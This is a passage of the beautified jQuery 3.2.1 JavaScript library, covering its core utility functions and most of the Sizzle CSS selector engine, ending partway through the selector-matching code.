/*! jQuery v3.2.1 | (c) JS Foundation and other contributors | jquery.org/license */ ! function(t, e) {
    "use strict";
    "object" == typeof module && "object" == typeof module.exports ? module.exports = t.document ? e(t, !0) : function(t) {
        if (!t.document) throw new Error("jQuery requires a window with a document");
        return e(t)
    } : e(t)
}("undefined" != typeof window ? window : this, (function(t, e) {
    "use strict";
    var n = [],
        i = t.document,
        o = Object.getPrototypeOf,
        r = n.slice,
        s = n.concat,
        a = n.push,
        l = n.indexOf,
        c = {},
        u = c.toString,
        p = c.hasOwnProperty,
        h = p.toString,
        d = h.call(Object),
        f = {};

    function m(t, e) {
        var n = (e = e || i).createElement("script");
        n.text = t, e.head.appendChild(n).parentNode.removeChild(n)
    }
    var g = "3.2.1",
        v = function(t, e) {
            return new v.fn.init(t, e)
        },
        y = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,
        b = /^-ms-/,
        x = /-([a-z])/g,
        w = function(t, e) {
            return e.toUpperCase()
        };

    function k(t) {
        var e = !!t && "length" in t && t.length,
            n = v.type(t);
        return "function" !== n && !v.isWindow(t) && ("array" === n || 0 === e || "number" == typeof e && e > 0 && e - 1 in t)
    }
    v.fn = v.prototype = {
        jquery: g,
        constructor: v,
        length: 0,
        toArray: function() {
            return r.call(this)
        },
        get: function(t) {
            return null == t ? r.call(this) : t < 0 ? this[t + this.length] : this[t]
        },
        pushStack: function(t) {
            var e = v.merge(this.constructor(), t);
            return e.prevObject = this, e
        },
        each: function(t) {
            return v.each(this, t)
        },
        map: function(t) {
            return this.pushStack(v.map(this, (function(e, n) {
                return t.call(e, n, e)
            })))
        },
        slice: function() {
            return this.pushStack(r.apply(this, arguments))
        },
        first: function() {
            return this.eq(0)
        },
        last: function() {
            return this.eq(-1)
        },
        eq: function(t) {
            var e = this.length,
                n = +t + (t < 0 ? e : 0);
            return this.pushStack(n >= 0 && n < e ? [this[n]] : [])
        },
        end: function() {
            return this.prevObject || this.constructor()
        },
        push: a,
        sort: n.sort,
        splice: n.splice
    }, v.extend = v.fn.extend = function() {
        var t, e, n, i, o, r, s = arguments[0] || {},
            a = 1,
            l = arguments.length,
            c = !1;
        for ("boolean" == typeof s && (c = s, s = arguments[a] || {}, a++), "object" == typeof s || v.isFunction(s) || (s = {}), a === l && (s = this, a--); a < l; a++)
            if (null != (t = arguments[a]))
                for (e in t) n = s[e], s !== (i = t[e]) && (c && i && (v.isPlainObject(i) || (o = Array.isArray(i))) ? (o ? (o = !1, r = n && Array.isArray(n) ? n : []) : r = n && v.isPlainObject(n) ? n : {}, s[e] = v.extend(c, r, i)) : void 0 !== i && (s[e] = i));
        return s
    }, v.extend({
        expando: "jQuery" + (g + Math.random()).replace(/\D/g, ""),
        isReady: !0,
        error: function(t) {
            throw new Error(t)
        },
        noop: function() {},
        isFunction: function(t) {
            return "function" === v.type(t)
        },
        isWindow: function(t) {
            return null != t && t === t.window
        },
        isNumeric: function(t) {
            var e = v.type(t);
            return ("number" === e || "string" === e) && !isNaN(t - parseFloat(t))
        },
        isPlainObject: function(t) {
            var e, n;
            return !(!t || "[object Object]" !== u.call(t) || (e = o(t)) && (n = p.call(e, "constructor") && e.constructor, "function" != typeof n || h.call(n) !== d))
        },
        isEmptyObject: function(t) {
            var e;
            for (e in t) return !1;
            return !0
        },
        type: function(t) {
            return null == t ? t + "" : "object" == typeof t || "function" == typeof t ? c[u.call(t)] || "object" : typeof t
        },
        globalEval: function(t) {
            m(t)
        },
        camelCase: function(t) {
            return t.replace(b, "ms-").replace(x, w)
        },
        each: function(t, e) {
            var n, i = 0;
            if (k(t))
                for (n = t.length; i < n && !1 !== e.call(t[i], i, t[i]); i++);
            else
                for (i in t)
                    if (!1 === e.call(t[i], i, t[i])) break; return t
        },
        trim: function(t) {
            return null == t ? "" : (t + "").replace(y, "")
        },
        makeArray: function(t, e) {
            var n = e || [];
            return null != t && (k(Object(t)) ? v.merge(n, "string" == typeof t ? [t] : t) : a.call(n, t)), n
        },
        inArray: function(t, e, n) {
            return null == e ? -1 : l.call(e, t, n)
        },
        merge: function(t, e) {
            for (var n = +e.length, i = 0, o = t.length; i < n; i++) t[o++] = e[i];
            return t.length = o, t
        },
        grep: function(t, e, n) {
            for (var i = [], o = 0, r = t.length, s = !n; o < r; o++) !e(t[o], o) !== s && i.push(t[o]);
            return i
        },
        map: function(t, e, n) {
            var i, o, r = 0,
                a = [];
            if (k(t))
                for (i = t.length; r < i; r++) null != (o = e(t[r], r, n)) && a.push(o);
            else
                for (r in t) null != (o = e(t[r], r, n)) && a.push(o);
            return s.apply([], a)
        },
        guid: 1,
        proxy: function(t, e) {
            var n, i, o;
            if ("string" == typeof e && (n = t[e], e = t, t = n), v.isFunction(t)) return i = r.call(arguments, 2), (o = function() {
                return t.apply(e || this, i.concat(r.call(arguments)))
            }).guid = t.guid = t.guid || v.guid++, o
        },
        now: Date.now,
        support: f
    }), "function" == typeof Symbol && (v.fn[Symbol.iterator] = n[Symbol.iterator]), v.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), (function(t, e) {
        c["[object " + e + "]"] = e.toLowerCase()
    }));
    var C = function(t) {
        var e, n, i, o, r, s, a, l, c, u, p, h, d, f, m, g, v, y, b, x = "sizzle" + 1 * new Date,
            w = t.document,
            k = 0,
            C = 0,
            _ = st(),
            S = st(),
            T = st(),
            E = function(t, e) {
                return t === e && (p = !0), 0
            },
            P = {}.hasOwnProperty,
            $ = [],
            A = $.pop,
            D = $.push,
            M = $.push,
            O = $.slice,
            j = function(t, e) {
                for (var n = 0, i = t.length; n < i; n++)
                    if (t[n] === e) return n;
                return -1
            },
            L = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
            F = "[\\x20\\t\\r\\n\\f]",
            N = "(?:\\\\.|[\\w-]|[^\0-\\xa0])+",
            I = "\\[" + F + "*(" + N + ")(?:" + F + "*([*^$|!~]?=)" + F + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + N + "))|)" + F + "*\\]",
            R = ":(" + N + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + I + ")*)|.*)\\)|)",
            H = new RegExp(F + "+", "g"),
            B = new RegExp("^" + F + "+|((?:^|[^\\\\])(?:\\\\.)*)" + F + "+$", "g"),
            q = new RegExp("^" + F + "*," + F + "*"),
            z = new RegExp("^" + F + "*([>+~]|" + F + ")" + F + "*"),
            W = new RegExp("=" + F + "*([^\\]'\"]*?)" + F + "*\\]", "g"),
            G = new RegExp(R),
            X = new RegExp("^" + N + "$"),
            V = {
                ID: new RegExp("^#(" + N + ")"),
                CLASS: new RegExp("^\\.(" + N + ")"),
                TAG: new RegExp("^(" + N + "|[*])"),
                ATTR: new RegExp("^" + I),
                PSEUDO: new RegExp("^" + R),
                CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + F + "*(even|odd|(([+-]|)(\\d*)n|)" + F + "*(?:([+-]|)" + F + "*(\\d+)|))" + F + "*\\)|)", "i"),
                bool: new RegExp("^(?:" + L + ")$", "i"),
                needsContext: new RegExp("^" + F + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + F + "*((?:-\\d)?\\d*)" + F + "*\\)|)(?=[^-]|$)", "i")
            },
            U = /^(?:input|select|textarea|button)$/i,
            Y = /^h\d$/i,
            Q = /^[^{]+\{\s*\[native \w/,
            Z = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
            K = /[+~]/,
            J = new RegExp("\\\\([\\da-f]{1,6}" + F + "?|(" + F + ")|.)", "ig"),
            tt = function(t, e, n) {
                var i = "0x" + e - 65536;
                return i != i || n ? e : i < 0 ? String.fromCharCode(i + 65536) : String.fromCharCode(i >> 10 | 55296, 1023 & i | 56320)
            },
            et = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,
            nt = function(t, e) {
                return e ? "\0" === t ? "�" : t.slice(0, -1) + "\\" + t.charCodeAt(t.length - 1).toString(16) + " " : "\\" + t
            },
            it = function() {
                h()
            },
            ot = yt((function(t) {
                return !0 === t.disabled && ("form" in t || "label" in t)
            }), {
                dir: "parentNode",
                next: "legend"
            });
        try {
            M.apply($ = O.call(w.childNodes), w.childNodes), $[w.childNodes.length].nodeType
        } catch (t) {
            M = {
                apply: $.length ? function(t, e) {
                    D.apply(t, O.call(e))
                } : function(t, e) {
                    for (var n = t.length, i = 0; t[n++] = e[i++];);
                    t.length = n - 1
                }
            }
        }

        function rt(t, e, i, o) {
            var r, a, c, u, p, f, v, y = e && e.ownerDocument,
                k = e ? e.nodeType : 9;
            if (i = i || [], "string" != typeof t || !t || 1 !== k && 9 !== k && 11 !== k) return i;
            if (!o && ((e ? e.ownerDocument || e : w) !== d && h(e), e = e || d, m)) {
                if (11 !== k && (p = Z.exec(t)))
                    if (r = p[1]) {
                        if (9 === k) {
                            if (!(c = e.getElementById(r))) return i;
                            if (c.id === r) return i.push(c), i
                        } else if (y && (c = y.getElementById(r)) && b(e, c) && c.id === r) return i.push(c), i
                    } else {
                        if (p[2]) return M.apply(i, e.getElementsByTagName(t)), i;
                        if ((r = p[3]) && n.getElementsByClassName && e.getElementsByClassName) return M.apply(i, e.getElementsByClassName(r)), i
                    }
                if (n.qsa && !T[t + " "] && (!g || !g.test(t))) {
                    if (1 !== k) y = e, v = t;
                    else if ("object" !== e.nodeName.toLowerCase()) {
                        for ((u = e.getAttribute("id")) ? u = u.replace(et, nt) : e.setAttribute("id", u = x), a = (f = s(t)).length; a--;) f[a] = "#" + u + " " + vt(f[a]);
                        v = f.join(","), y = K.test(t) && mt(e.parentNode) || e
                    }
                    if (v) try {
                        return M.apply(i, y.querySelectorAll(v)), i
                    } catch (t) {} finally {
                        u === x && e.removeAttribute("id")
                    }
                }
            }
            return l(t.replace(B, "$1"), e, i, o)
        }

        function st() {
            var t = [];
            return function e(n, o) {
                return t.push(n + " ") > i.cacheLength && delete e[t.shift()], e[n + " "] = o
            }
        }

        function at(t) {
            return t[x] = !0, t
        }

        function lt(t) {
            var e = d.createElement("fieldset");
            try {
                return !!t(e)
            } catch (t) {
                return !1
            } finally {
                e.parentNode && e.parentNode.removeChild(e), e = null
            }
        }

        function ct(t, e) {
            for (var n = t.split("|"), o = n.length; o--;) i.attrHandle[n[o]] = e
        }

        function ut(t, e) {
            var n = e && t,
                i = n && 1 === t.nodeType && 1 === e.nodeType && t.sourceIndex - e.sourceIndex;
            if (i) return i;
            if (n)
                for (; n = n.nextSibling;)
                    if (n === e) return -1;
            return t ? 1 : -1
        }

        function pt(t) {
            return function(e) {
                return "input" === e.nodeName.toLowerCase() && e.type === t
            }
        }

        function ht(t) {
            return function(e) {
                var n = e.nodeName.toLowerCase();
                return ("input" === n || "button" === n) && e.type === t
            }
        }

        function dt(t) {
            return function(e) {
                return "form" in e ? e.parentNode && !1 === e.disabled ? "label" in e ? "label" in e.parentNode ? e.parentNode.disabled === t : e.disabled === t : e.isDisabled === t || e.isDisabled !== !t && ot(e) === t : e.disabled === t : "label" in e && e.disabled === t
            }
        }

        function ft(t) {
            return at((function(e) {
                return e = +e, at((function(n, i) {
                    for (var o, r = t([], n.length, e), s = r.length; s--;) n[o = r[s]] && (n[o] = !(i[o] = n[o]))
                }))
            }))
        }

        function mt(t) {
            return t && void 0 !== t.getElementsByTagName && t
        }
        for (e in n = rt.support = {}, r = rt.isXML = function(t) {
                var e = t && (t.ownerDocument || t).documentElement;
                return !!e && "HTML" !== e.nodeName
            }, h = rt.setDocument = function(t) {
                var e, o, s = t ? t.ownerDocument || t : w;
                return s !== d && 9 === s.nodeType && s.documentElement ? (f = (d = s).documentElement, m = !r(d), w !== d && (o = d.defaultView) && o.top !== o && (o.addEventListener ? o.addEventListener("unload", it, !1) : o.attachEvent && o.attachEvent("onunload", it)), n.attributes = lt((function(t) {
                    return t.className = "i", !t.getAttribute("className")
                })), n.getElementsByTagName = lt((function(t) {
                    return t.appendChild(d.createComment("")), !t.getElementsByTagName("*").length
                })), n.getElementsByClassName = Q.test(d.getElementsByClassName), n.getById = lt((function(t) {
                    return f.appendChild(t).id = x, !d.getElementsByName || !d.getElementsByName(x).length
                })), n.getById ? (i.filter.ID = function(t) {
                    var e = t.replace(J, tt);
                    return function(t) {
                        return t.getAttribute("id") === e
                    }
                }, i.find.ID = function(t, e) {
                    if (void 0 !== e.getElementById && m) {
                        var n = e.getElementById(t);
                        return n ? [n] : []
                    }
                }) : (i.filter.ID = function(t) {
                    var e = t.replace(J, tt);
                    return function(t) {
                        var n = void 0 !== t.getAttributeNode && t.getAttributeNode("id");
                        return n && n.value === e
                    }
                }, i.find.ID = function(t, e) {
                    if (void 0 !== e.getElementById && m) {
                        var n, i, o, r = e.getElementById(t);
                        if (r) {
                            if ((n = r.getAttributeNode("id")) && n.value === t) return [r];
                            for (o = e.getElementsByName(t), i = 0; r = o[i++];)
                                if ((n = r.getAttributeNode("id")) && n.value === t) return [r]
                        }
                        return []
                    }
                }), i.find.TAG = n.getElementsByTagName ? function(t, e) {
                    return void 0 !== e.getElementsByTagName ? e.getElementsByTagName(t) : n.qsa ? e.querySelectorAll(t) : void 0
                } : function(t, e) {
                    var n, i = [],
                        o = 0,
                        r = e.getElementsByTagName(t);
                    if ("*" === t) {
                        for (; n = r[o++];) 1 === n.nodeType && i.push(n);
                        return i
                    }
                    return r
                }, i.find.CLASS = n.getElementsByClassName && function(t, e) {
                    if (void 0 !== e.getElementsByClassName && m) return e.getElementsByClassName(t)
                }, v = [], g = [], (n.qsa = Q.test(d.querySelectorAll)) && (lt((function(t) {
                    f.appendChild(t).innerHTML = "<a id='" + x + "'></a><select id='" + x + "-\r\\' msallowcapture=''><option selected=''></option></select>", t.querySelectorAll("[msallowcapture^='']").length && g.push("[*^$]=" + F + "*(?:''|\"\")"), t.querySelectorAll("[selected]").length || g.push("\\[" + F + "*(?:value|" + L + ")"), t.querySelectorAll("[id~=" + x + "-]").length || g.push("~="), t.querySelectorAll(":checked").length || g.push(":checked"), t.querySelectorAll("a#" + x + "+*").length || g.push(".#.+[+~]")
                })), lt((function(t) {
                    t.innerHTML = "<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";
                    var e = d.createElement("input");
                    e.setAttribute("type", "hidden"), t.appendChild(e).setAttribute("name", "D"), t.querySelectorAll("[name=d]").length && g.push("name" + F + "*[*^$|!~]?="), 2 !== t.querySelectorAll(":enabled").length && g.push(":enabled", ":disabled"), f.appendChild(t).disabled = !0, 2 !== t.querySelectorAll(":disabled").length && g.push(":enabled", ":disabled"), t.querySelectorAll("*,:x"), g.push(",.*:")
                }))), (n.matchesSelector = Q.test(y = f.matches || f.webkitMatchesSelector || f.mozMatchesSelector || f.oMatchesSelector || f.msMatchesSelector)) && lt((function(t) {
                    n.disconnectedMatch = y.call(t, "*"), y.call(t, "[s!='']:x"), v.push("!=", R)
                })), g = g.length && new RegExp(g.join("|")), v = v.length && new RegExp(v.join("|")), e = Q.test(f.compareDocumentPosition), b = e || Q.test(f.contains) ? function(t, e) {
                    var n = 9 === t.nodeType ? t.documentElement : t,
                        i = e && e.parentNode;
                    return t === i || !(!i || 1 !== i.nodeType || !(n.contains ? n.contains(i) : t.compareDocumentPosition && 16 & t.compareDocumentPosition(i)))
                } : function(t, e) {
                    if (e)
                        for (; e = e.parentNode;)
                            if (e === t) return !0;
                    return !1
                }, E = e ? function(t, e) {
                    if (t === e) return p = !0, 0;
                    var i = !t.compareDocumentPosition - !e.compareDocumentPosition;
                    return i || (1 & (i = (t.ownerDocument || t) === (e.ownerDocument || e) ? t.compareDocumentPosition(e) : 1) || !n.sortDetached && e.compareDocumentPosition(t) === i ? t === d || t.ownerDocument === w && b(w, t) ? -1 : e === d || e.ownerDocument === w && b(w, e) ? 1 : u ? j(u, t) - j(u, e) : 0 : 4 & i ? -1 : 1)
                } : function(t, e) {
                    if (t === e) return p = !0, 0;
                    var n, i = 0,
                        o = t.parentNode,
                        r = e.parentNode,
                        s = [t],
                        a = [e];
                    if (!o || !r) return t === d ? -1 : e === d ? 1 : o ? -1 : r ? 1 : u ? j(u, t) - j(u, e) : 0;
                    if (o === r) return ut(t, e);
                    for (n = t; n = n.parentNode;) s.unshift(n);
                    for (n = e; n = n.parentNode;) a.unshift(n);
                    for (; s[i] === a[i];) i++;
                    return i ? ut(s[i], a[i]) : s[i] === w ? -1 : a[i] === w ? 1 : 0
                }, d) : d
            }, rt.matches = function(t, e) {
                return rt(t, null, null, e)
            }, rt.matchesSelector = function(t, e) {
                if ((t.ownerDocument || t) !== d && h(t), e = e.replace(W, "='$1']"), n.matchesSelector && m && !T[e + " "] && (!v || !v.test(e)) && (!g || !g.test(e))) try {
                    var i = y.call(t, e);
                    if (i || n.disconnectedMatch || t.document && 11 !== t.document.nodeType) return i
                } catch (t) {}
                return rt(e, d, null, [t]).length > 0
            }, rt.contains = function(t, e) {
                return (t.ownerDocument || t) !== d && h(t), b(t, e)
            }, rt.attr = function(t, e) {
                (t.ownerDocument || t) !== d && h(t);
                var o = i.attrHandle[e.toLowerCase()],
                    r = o && P.call(i.attrHandle, e.toLowerCase()) ? o(t, e, !m) : void 0;
                return void 0 !== r ? r : n.attributes || !m ? t.getAttribute(e) : (r = t.getAttributeNode(e)) && r.specified ? r.value : null
            }, rt.escape = function(t) {
                return (t + "").replace(et, nt)
            }, rt.error = function(t) {
                throw new Error("Syntax error, unrecognized expression: " + t)
            }, rt.uniqueSort = function(t) {
                var e, i = [],
                    o = 0,
                    r = 0;
                if (p = !n.detectDuplicates, u = !n.sortStable && t.slice(0), t.sort(E), p) {
                    for (; e = t[r++];) e === t[r] && (o = i.push(r));
                    for (; o--;) t.splice(i[o], 1)
                }
                return u = null, t
            }, o = rt.getText = function(t) {
                var e, n = "",
                    i = 0,
                    r = t.nodeType;
                if (r) {
                    if (1 === r || 9 === r || 11 === r) {
                        if ("string" == typeof t.textContent) return t.textContent;
                        for (t = t.firstChild; t; t = t.nextSibling) n += o(t)
                    } else if (3 === r || 4 === r) return t.nodeValue
                } else
                    for (; e = t[i++];) n += o(e);
                return n
            }, (i = rt.selectors = {
                cacheLength: 50,
                createPseudo: at,
                match: V,
                attrHandle: {},
                find: {},
                relative: {
                    ">": {
                        dir: "parentNode",
                        first: !0
                    },
                    " ": {
                        dir: "parentNode"
                    },
                    "+": {
                        dir: "previousSibling",
                        first: !0
                    },
                    "~": {
                        dir: "previousSibling"
                    }
                },
                preFilter: {
                    ATTR: function(t) {
                        return t[1] = t[1].replace(J, tt), t[3] = (t[3] || t[4] || t[5] || "").replace(J, tt), "~=" === t[2] && (t[3] = " " + t[3] + " "), t.slice(0, 4)
                    },
                    CHILD: function(t) {
                        return t[1] = t[1].toLowerCase(), "nth" === t[1].slice(0, 3) ? (t[3] || rt.error(t[0]), t[4] = +(t[4] ? t[5] + (t[6] || 1) : 2 * ("even" === t[3] || "odd" === t[3])), t[5] = +(t[7] + t[8] || "odd" === t[3])) : t[3] && rt.error(t[0]), t
                    },
                    PSEUDO: function(t) {
                        var e, n = !t[6] && t[2];
                        return V.CHILD.test(t[0]) ? null : (t[3] ? t[2] = t[4] || t[5] || "" : n && G.test(n) && (e = s(n, !0)) && (e = n.indexOf(")", n.length - e) - n.length) && (t[0] = t[0].slice(0, e), t[2] = n.slice(0, e)), t.slice(0, 3))
                    }
                },
                filter: {
                    TAG: function(t) {
                        var e = t.replace(J, tt).toLowerCase();
                        return "*" === t ? function() {
                            return !0
                        } : function(t) {
                            return t.nodeName && t.nodeName.toLowerCase() === e
                        }
                    },
                    CLASS: function(t) {
                        var e = _[t + " "];
                        return e || (e = new RegExp("(^|" + F + ")" + t + "(" + F + "|$)")) && _(t, (function(t) {
                            return e.test("string" == typeof t.className && t.className || void 0 !== t.getAttribute && t.getAttribute("class") || "")
                        }))
                    },
                    ATTR: function(t, e, n) {
                        return function(i) {
                            var o = rt.attr(i, t);
                            return null == o ? "!=" === e : !e || (o += "", "=" === e ? o === n : "!=" === e ? o !== n : "^=" === e ? n && 0 === o.indexOf(n) : "*=" === e ? n && o.indexOf(n) > -1 : "$=" === e ? n && o.slice(-n.length) === n : "~=" === e ? (" " + o.replace(H, " ") + " ").indexOf(n) > -1 : "|=" === e && (o === n || o.slice(0, n.length + 1) === n + "-"))
                        }
                    },
                    CHILD: function(t, e, n, i, o) {
                        var r = "nth" !== t.slice(0, 3),
                            s = "last" !== t.slice(-4),
                            a = "of-type" === e;
                        return 1 === i && 0 === o ? function(t) {
                            return !!t.parentNode
                        } : function(e, n, l) {
                            var c, u, p, h, d, f, m = r !== s ? "nextSibling" : "previousSibling",
                                g = e.parentNode,
                                v = a && e.nodeName.toLowerCase(),
                                y = !l && !a,
                                b = !1;
                            if (g) {
                                if (r) {
                                    for (; m;) {
                                        for (h = e; h = h[m];)
                                            if (a ? h.nodeName.toLowerCase() === v : 1 === h.nodeType) return !1;
                                        f = m = "only" === t && !f && "nextSibling"
                                    }
                                    return !0
                                }
                                if (f = [s ? g.firstChild : g.lastChild], s && y) {
                                    for (b = (d = (c = (u = (p = (h = g)[x] || (h[x] = {}))[h.uniqueID] || (p[h.uniqueID] = {}))[t] || [])[0] === k && c[1]) && c[2], h = d && g.childNodes[d]; h = ++d && h && h[m] || (b = d = 0) || f.pop();)
                                        if (1 === h.nodeType && ++b && h === e) {
                                            u[t] = [k, d, b];
                                            break
                                        }
                                } else if (y && (b = d = (c = (u = (p = (h = e)[x] || (h[x] = {}))[h.uniqueID] || (p[h.uniqueID] = {}))[t] || [])[0] === k && c[1]), !1 === b)
                                    for (;
                                        (h = ++d && h && h[m] || (b = d = 0) || f.pop()) && ((a ? h.nodeName.toLowerCase() !== v : 1 !== h.nodeType) || !++b || (y && ((u = (p = h[x] || (h[x] = {}))[h.uniqueID] || (p[h.uniqueID] = {}))[t] = [k, b]), h !== e)););
                                return (b -= o) === i || b % i == 0 && b / i >= 0
                            }
                        }
                    },
                    PSEUDO: function(t, e) {
                        var n, o = i.pseudos[t] || i.setFilters[t.toLowerCase()] || rt.error("unsupported pseudo: " + t);
                        return o[x] ? o(e) : o.length > 1 ? (n = [t, t, "", e], i.setFilters.hasOwnProperty(t.toLowerCase()) ? at((function(t, n) {
                            for (var i, r = o(t, e), s = r.length; s--;) t[i = j(t, r[s])] = !(n[i] = r[s])
                        })) : function(t) {
                            return o(t, 0, n)
                        }) : o
                    }
                },
                pseudos: {
                    not: at((function(t) {
                        var e = [],
                            n = [],
                            i = a(t.replace(B, "$1"));
                        return i[x] ? at((function(t, e, n, o) {
                            for (var r, s = i(t, null, o, []), a = t.length; a--;)(r = s[a]) && (t[a] = !(e[a] = r))
                        })) : function(t, o, r) {
                            return e[0] = t, i(e, null, r, n), e[0] = null, !n.pop()
                        }
                    })),
                    has: at((function(t) {
                        return function(e) {
                            return rt(t, e).length > 0
                        }
                    })),
                    contains: at((function(t) {
                        return t = t.replace(J, tt),
                            function(e) {
                                return (e.textContent || e.innerText || o(e)).indexOf(t) > -1
                            }
                    })),
                    lang: at((function(t) {
                        return X.test(t || "") || rt.error("unsupported lang: " + t), t = t.replace(J, tt).toLowerCase(),
                            function(e) {
                                var n;
                                do {
                                    if (n = m ? e.lang : e.getAttribute("xml:lang") || e.getAttribute("lang")) return (n = n.toLowerCase()) === t || 0 === n.indexOf(t + "-")
                                } while ((e = e.parentNode) && 1 === e.nodeType);
                                return !1
                            }
                    })),
                    target: function(e) {
                        var n = t.location && t.location.hash;
                        return n && n.slice(1) === e.id
                    },
                    root: function(t) {
                        return t === f
                    },
                    focus: function(t) {
                        return t === d.activeElement && (!d.hasFocus || d.hasFocus()) && !!(t.type || t.href || ~t.tabIndex)
                    },
                    enabled: dt(!1),
                    disabled: dt(!0),
                    checked: function(t) {
                        var e = t.nodeName.toLowerCase();
                        return "input" === e && !!t.checked || "option" === e && !!t.selected
                    },
                    selected: function(t) {
                        return t.parentNode && t.parentNode.selectedIndex, !0 === t.selected
                    },
                    empty: function(t) {
                        for (t = t.firstChild; t; t = t.nextSibling)
                            if (t.nodeType < 6) return !1;
                        return !0
                    },
                    parent: function(t) {
                        return !i.pseudos.empty(t)
                    },
                    header: function(t) {
                        return Y.test(t.nodeName)
                    },
                    input: function(t) {
                        return U.test(t.nodeName)
                    },
                    button: function(t) {
                        var e = t.nodeName.toLowerCase();
                        return "input" === e && "button" === t.type || "button" === e
                    },
                    text: function(t) {
                        var e;
                        return "input" === t.nodeName.toLowerCase() && "text" === t.type && (null == (e = t.getAttribute("type")) || "text" === e.toLowerCase())
                    },
                    first: ft((function() {
                        return [0]
                    })),
                    last: ft((function(t, e) {
                        return [e - 1]
                    })),
                    eq: ft((function(t, e, n) {
                        return [n < 0 ? n + e : n]
                    })),
                    even: ft((function(t, e) {
                        for (var n = 0; n < e; n += 2) t.push(n);
                        return t
                    })),
                    odd: ft((function(t, e) {
                        for (var n = 1; n < e; n += 2) t.push(n);
                        return t
                    })),
                    lt: ft((function(t, e, n) {
                        for (var i = n < 0 ? n + e : n; --i >= 0;) t.push(i);
                        return t
                    })),
                    gt: ft((function(t, e, n) {
                        for (var i = n < 0 ? n + e : n; ++i < e;) t.push(i);
                        return t
                    }))
                }
            }).pseudos.nth = i.pseudos.eq, {
                radio: !0,
                checkbox: !0,
                file: !0,
                password: !0,
                image: !0
            }) i.pseudos[e] = pt(e);
        for (e in {
                submit: !0,
                reset: !0
            }) i.pseudos[e] = ht(e);

        function gt() {}

        function vt(t) {
            for (var e = 0, n = t.length, i = ""; e < n; e++) i += t[e].value;
            return i
        }

        function yt(t, e, n) {
            var i = e.dir,
                o = e.next,
                r = o || i,
                s = n && "parentNode" === r,
                a = C++;
            return e.first ? function(e, n, o) {
                for (; e = e[i];)
                    if (1 === e.nodeType || s) return t(e, n, o);
                return !1
            } : function(e, n, l) {
                var c, u, p, h = [k, a];
                if (l) {
                    for (; e = e[i];)
                        if ((1 === e.nodeType || s) && t(e, n, l)) return !0
                } else
                    for (; e = e[i];)
                        if (1 === e.nodeType || s)
                            if (u = (p = e[x] || (e[x] = {}))[e.uniqueID] || (p[e.uniqueID] = {}), o && o === e.nodeName.toLowerCase()) e = e[i] || e;
                            else {
                                if ((c = u[r]) && c[0] === k && c[1] === a) return h[2] = c[2];
                                if (u[r] = h, h[2] = t(e, n, l)) return !0
                            } return !1
            }
        }

        function bt(t) {
            return t.length > 1 ? function(e, n, i) {
                for (var o = t.length; o--;)
                    if (!t[o](e, n, i)) return !1;
                return !0
            } : t[0]
        }

        function xt(t, e, n, i, o) {
            for (var r, s = [], a = 0, l = t.length, c = null != e; a < l; a++)(r = t[a]) && (n && !n(r, i, o) || (s.push(r), c && e.push(a)));
            return s
        }

        function wt(t, e, n, i, o, r) {
            return i && !i[x] && (i = wt(i)), o && !o[x] && (o = wt(o, r)), at((function(r, s, a, l) {
                var c, u, p, h = [],
                    d = [],
                    f = s.length,
                    m = r || function(t, e, n) {
                        for (var i = 0, o = e.length; i < o; i++) rt(t, e[i], n);
                        return n
                    }(e || "*", a.nodeType ? [a] : a, []),
                    g = !t || !r && e ? m : xt(m, h, t, a, l),
                    v = n ? o || (r ? t : f || i) ? [] : s : g;
                if (n && n(g, v, a, l), i)
                    for (c = xt(v, d), i(c, [], a, l), u = c.length; u--;)(p = c[u]) && (v[d[u]] = !(g[d[u]] = p));
                if (r) {
                    if (o || t) {
                        if (o) {
                            for (c = [], u = v.length; u--;)(p = v[u]) && c.push(g[u] = p);
                            o(null, v = [], c, l)
                        }
                        for (u = v.length; u--;)(p = v[u]) && (c = o ? j(r, p) : h[u]) > -1 && (r[c] = !(s[c] = p))
                    }
                } else v = xt(v === s ? v.splice(f, v.length) : v), o ? o(null, s, v, l) : M.apply(s, v)
            }))
        }

        function kt(t) {
            for (var e, n, o, r = t.length, s = i.relative[t[0].type], a = s || i.relative[" "], l = s ? 1 : 0, u = yt((function(t) {
                    return t === e
                }), a, !0), p = yt((function(t) {
                    return j(e, t) > -1
                }), a, !0), h = [function(t, n, i) {
                    var o = !s && (i || n !== c) || ((e = n).nodeType ? u(t, n, i) : p(t, n, i));
                    return e = null, o
                }]; l < r; l++)
                if (n = i.relative[t[l].type]) h = [yt(bt(h), n)];
                else {
                    if ((n = i.filter[t[l].type].apply(null, t[l].matches))[x]) {
                        for (o = ++l; o < r && !i.relative[t[o].type]; o++);
                        return wt(l > 1 && bt(h), l > 1 && vt(t.slice(0, l - 1).concat({
                            value: " " === t[l - 2].type ? "*" : ""
                        })).replace(B, "$1"), n, l < o && kt(t.slice(l, o)), o < r && kt(t = t.slice(o)), o < r && vt(t))
                    }
                    h.push(n)
                }
            return bt(h)
        }

        function Ct(t, e) {
            var n = e.length > 0,
                o = t.length > 0,
                r = function(r, s, a, l, u) {
                    var p, f, g, v = 0,
                        y = "0",
                        b = r && [],
                        x = [],
                        w = c,
                        C = r || o && i.find.TAG("*", u),
                        _ = k += null == w ? 1 : Math.random() || .1,
                        S = C.length;
                    for (u && (c = s === d || s || u); y !== S && null != (p = C[y]); y++) {
                        if (o && p) {
                            for (f = 0, s || p.ownerDocument === d || (h(p), a = !m); g = t[f++];)
                                if (g(p, s || d, a)) {
                                    l.push(p);
                                    break
                                }
                            u && (k = _)
                        }
                        n && ((p = !g && p) && v--, r && b.push(p))
                    }
                    if (v += y, n && y !== v) {
                        for (f = 0; g = e[f++];) g(b, x, s, a);
                        if (r) {
                            if (v > 0)
                                for (; y--;) b[y] || x[y] || (x[y] = A.call(l));
                            x = xt(x)
                        }
